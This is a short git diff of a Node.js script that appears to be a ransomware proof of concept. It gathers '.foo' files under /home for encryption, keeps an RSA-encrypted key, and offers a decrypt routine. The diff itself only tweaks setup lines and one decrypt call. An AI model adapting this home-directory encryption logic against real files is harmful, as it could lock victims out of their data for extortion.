@@ -1,4 +1,8 @@
 'use strict'
+
+// Loading environment Variables
+require('dotenv').load();
+
 // Library for finding Files
 var fileFinder = require('fs-finder');
 
@@ -13,13 +17,12 @@ var localRSA = require('./js/rsa.js');
 var encryptor = require('file-encryptor');
 
 // Native Node.js library to execute commands on shells
-var sys = require('sys');
+//var sys = require('sys');
 var exe = require('child_process').exec;
 
 
 var encryptedKey = '';
 
-// List of all the files that will be encrypted
 var files = fileFinder.from('/home').findFiles('*.foo');
 var encryptedFiles = [];
 
@@ -75,7 +78,7 @@ function encryptFiles(){
 function deCryptFiles(key){
   console.log(key)
   encryptedFiles.forEach(function(file) {
-    encryptor.decryptFile(file, file + '.foo', key, options, function(err) {
+    encryptor.decryptFile(file, file + '.foo', key, function(err) {
       if(err)
       console.log('Cannot decrypt the file: '+ file);
     });
